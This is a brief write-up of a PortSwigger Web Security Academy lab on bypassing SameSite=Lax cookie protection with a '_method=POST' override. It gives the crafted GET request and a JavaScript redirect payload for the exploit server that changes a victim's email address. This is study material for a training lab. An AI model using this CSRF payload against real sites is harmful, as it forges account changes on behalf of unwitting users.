# [SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

> on `SameSite=Lax` setup the change from `POST` to `GET` can result in an exploit, in this lab case `GET` method not allowed but `POST` does, making a `GET` method but changing it to `_method=POST` can be a workaround

```
GET /my-account/change-email?email=duck@quack&_method=POST HTTP/1.1
```

> in the exploit server the following script would go

```
<script>
  document.location =
    "https://xxx.web-security-academy.net/my-account/change-email?email=duck@quack&_method=POST";
</script>
```
